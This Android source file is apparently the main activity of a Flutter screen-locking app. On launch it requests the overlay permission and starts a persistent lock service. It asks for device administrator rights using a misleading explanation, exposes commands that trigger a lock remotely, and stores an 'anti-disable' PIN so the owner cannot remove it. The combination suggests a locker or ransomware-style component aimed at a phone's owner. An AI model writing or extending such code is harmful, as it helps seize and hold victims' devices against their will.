package com.nullx.pp;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.annotation.NonNull;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.Context;

public class MainActivity extends FlutterActivity {
    private static final String CHANNEL = "lock_channel";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
        
        // Mulai foreground service
        startBackgroundService();
    }
    
    private void startBackgroundService() {
        Intent intent = new Intent(this, LockService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("triggerLock")) {
                    String type = call.argument("type");
                    String data = call.argument("data");
                    Intent intent = new Intent(this, LockService.class);
                    intent.putExtra("lock_type", type);
                    intent.putExtra("lock_data", data);
                    startService(intent);
                    result.success(true);
                } 
                else if (call.method.equals("stopLock")) {
                    stopService(new Intent(this, LockService.class));
                    result.success(true);
                }
                else if (call.method.equals("isAdminActive")) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                    result.success(dpm.isAdminActive(adminName));
                }
                else if (call.method.equals("requestAdmin")) {
                    DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                    ComponentName adminName = new ComponentName(this, AdminReceiver.class);
                    if (!dpm.isAdminActive(adminName)) {
                        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName);
                        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan administrator ini agar aplikasi dapat berjalan dengan baik");
                        startActivity(intent);
                    }
                    result.success(true);
                }
                else if (call.method.equals("startBackgroundService")) {
                    startBackgroundService();
                    result.success(true);
                }
                // ============ TAMBAHAN: SET PIN ANTI DISABLE ============
                else if (call.method.equals("setAdminPin")) {
                    String pin = call.argument("pin");
                    SharedPreferences prefs = getSharedPreferences("admin_prefs", Context.MODE_PRIVATE);
                    prefs.edit().putString("admin_pin", pin).apply();
                    result.success(true);
                }
                // ============ AKHIR TAMBAHAN ============
                else {
                    result.notImplemented();
                }
            });
    }
}